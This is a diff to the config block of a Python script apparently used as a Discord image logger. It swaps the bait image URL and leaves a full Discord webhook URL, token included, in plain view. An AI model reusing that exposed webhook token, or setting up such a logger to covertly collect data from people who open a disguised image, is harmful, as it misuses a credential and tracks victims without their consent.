@@ -10,7 +10,7 @@ __author__ = "YoshiDevs"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1094334971155587192/inUax9d-7gYx29RAQXRR9_GCK3R27Yl6TJIFZxv3S3hDIZUqOy_HFQc5Sp8wQRSC2KCN",
-    "image": "https://m.extra.globo.com/incoming/23361447-cc0-e1e/w367h550-PROP/dwjw2c7x0aewk7s.jpg", # You can also have a custom image by using a URL
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTFHmHZlxahwpSkGykiZX0lNwF8AJ9LLFMqw&usqp=CAU", # You can also have a custom image by using a URL
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
